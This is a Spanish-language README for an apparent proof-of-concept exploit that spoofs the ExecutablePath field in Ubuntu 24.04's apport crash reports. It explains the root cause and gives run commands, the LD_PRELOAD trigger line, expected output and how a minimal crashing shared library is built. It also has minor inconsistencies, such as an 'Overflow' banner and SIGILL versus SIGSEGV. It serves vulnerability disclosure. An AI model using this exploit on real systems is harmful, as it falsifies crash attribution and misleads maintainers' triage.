# CVE-2026-XXXX: Apport ExecutablePath Spoofing

**Zero-day vulnerability** in Ubuntu Server 24.04 LTS apport 2.28.1

---

## Descripción

Apport contiene una vulnerabilidad de verificación insuficiente de autenticidad
de datos (CWE-345) en el método `_check_interpreted()` del archivo
`/usr/lib/python3/dist-packages/apport/report.py`, líneas 626-633.

El método confía ciegamente en `argv[1]` del proceso crash (`ProcCmdline`)
para sobrescribir el campo `ExecutablePath` en el reporte de crash, sin
verificar que ese archivo sea el que realmente ejecutó el proceso.

### Impacto

- **Atribución falsa**: El crash se reporta como si hubiera ocurrido en un
  binario diferente al real
- **Ejecución de hooks incorrectos**: Apport ejecuta los hooks del paquete
  correspondiente al `ExecutablePath` falsificado
- **Envenenamiento de triage**: Los reportes subidos a Launchpad/GitHub
  contienen información engañosa
- **Core dump del binario real** pero atribuido a otro archivo

### CVEs relacionados

| CVE | Año | Relación |
|-----|-----|----------|
| CVE-2019-15790 | 2019 | Path sanitization bypass en apport |
| CVE-2020-11935 | 2020 | Directory traversal via ExecutablePath |
| **CVE-2026-XXXX** | **2026** | **_check_interpreted() sin validación** |

Los parches de los CVEs anteriores solo protegieron `parse_arguments()` (la
ruta `%E` del kernel). `_check_interpreted()` nunca fue endurecido.

---

## Vector de explotación

```
LD_PRELOAD + intérprete (bash) + argv[1] controlado
  → apport procesa crash
  → _check_interpreted() ejecuta
  → ExecutablePath = argv[1] (SIN VERIFICACIÓN)
  → reporte de crash creado para el archivo falso
```

### Requisitos

- **Apport activo**: `systemctl is-active apport.service` (por defecto en Ubuntu)
- **Core dumps**: `ulimit -c unlimited`
- **Acceso local**: Shell como usuario no privilegiado
- **Sistema target**: Ubuntu 24.04 LTS con apport 2.28.1-0ubuntu3.8

### Por qué funciona

1. Apport recibe el crash del kernel via `core_pattern` pipe
2. Lee `/proc/PID/exe` → establece `ExecutablePath` al binario real
3. `_check_interpreted()` examina si el binario real coincide con
   intérpretes conocidos (`bash`, `python*`, `perl*`, etc.)
4. Si coincide, parsea `ProcCmdline` y **reemplaza** `ExecutablePath`
   con `argv[1]`
5. La única validación: `os.access(argv[1], os.R_OK)` — verifica
   legibilidad, no autenticidad del archivo

---

## Uso del exploit

### 1. Clonar el repo

```bash
git clone https://github.com/Ruby570bocadito/CVE-ubuntu-server-24.04.git
cd CVE-ubuntu-server-24.04
```

### 2. Ejecutar

```bash
# Asegurar core dumps
ulimit -c unlimited

# Ejecutar exploit (target por defecto: /usr/bin/passwd)
python3 exploit_apport.py

# Con target personalizado
python3 exploit_apport.py /usr/bin/su
python3 exploit_apport.py /bin/bash
```

### 3. Verificar

```bash
# Log de apport
cat /var/log/apport.log | grep "script:\|executable:"

# Reportes generados
ls -la /var/crash/

# Contenido del reporte (campo falsificado)
grep ExecutablePath /var/crash/*.crash
```

### Salida esperada

```
============================================================
  EXPLOIT: Apport ExecutablePath Overflow
  Target: /usr/bin/passwd
============================================================

[+] Target OK: /usr/bin/passwd (64152 bytes)
[+] Core limit: unlimited
[v] Apport: active
[+] Shared library generated: /tmp/.libexploit.so (344 bytes)
[+] ELF header OK: ET_DYN x86-64
[?] ld.so exit code: -11

[*] Disparando exploit...
    LD_PRELOAD=/tmp/.libexploit.so /usr/bin/bash /usr/bin/passwd

[+] bash exit code: -11 (CRASH (SIGNAL))
[+] Señal: 11 (SIGSEGV)

...

[+] Reporte: ExecutablePath: /usr/bin/passwd
[+] Reporte: InterpreterPath: /usr/bin/bash
[+] Reporte: Signal: 11
```

---

## Archivos

| Archivo | Descripción |
|---------|-------------|
| `exploit_apport.py` | Exploit completo auto-contenido (Python puro, no requiere gcc) |
| `.libexploit.so` | Shared library crash (344 bytes, ELF64 artesanal) |
| `pwn_apport.c` | C source para binary crash (alternativa con gcc) |
| `poc_apport_override.py` | PoC básico solo con Python (demostración del override) |
| `CVE-REQUEST-apport-executablepath-override.md` | Reporte formal para MITRE/Canonical |
| `_usr_bin_passwd.1000.crash` | Reporte de crash verificado (ExecutablePath falsificado) |
| `_var_tmp_poc_crash.py.1000.crash` | Reporte verificado via bypass de `/var/tmp/` |
| `apport.log` | Log completo del procesamiento de apport |

---

## Cómo funciona el .so

El exploit genera un shared library ELF64 mínima (344 bytes) SIN compilador.
La biblioteca contiene:

1. **ELF header** con `e_type = ET_DYN` (3)
2. **PT_LOAD** que mapea todo el binario como RX
3. **PT_DYNAMIC** con `DT_INIT` apuntando al código crash
4. **DT_HASH** (SysV hash table) para satisfacer al linker dinámico
5. **Código crash**: instrucción `ud2` (0F 0B) → SIGILL

Al cargarse via `LD_PRELOAD`, el dynamic linker ejecuta `DT_INIT` →
`ud2` → SIGILL → crash → kernel invoca apport.

---

## Hallazgos secundarios

| ID | Descripción | Archivo/Línea |
|----|-------------|---------------|
| H1 | Path traversal bypass en `parse_arguments`: `replace("!", "/")` antes de filtrar `../` | `apport:750-757` |
| H3 | Falso positivo en `likely_packaged()` para `/var/tmp/` | `fileutils.py:136-158` |
| TOCTOU | Ventana entre `os.access()` y `os.path.realpath()` en `_check_interpreted()` | `report.py:631-633` |

---

## Disclaimer

Este exploit fue desarrollado como parte de una auditoría de seguridad
autorizada en un entorno de laboratorio personal. Úselo únicamente en
sistemas donde tenga permiso explícito. El autor no se responsabiliza
por el uso indebido de esta investigación.

---

## Referencias

- [CWE-345: Insufficient Verification of Data Authenticity](https://cwe.mitre.org/data/definitions/345.html)
- [Apport - Ubuntu](https://wiki.ubuntu.com/Apport)
- [CVE-2019-15790](https://nvd.nist.gov/vuln/detail/CVE-2019-15790)
- [CVE-2020-11935](https://nvd.nist.gov/vuln/detail/CVE-2020-11935)
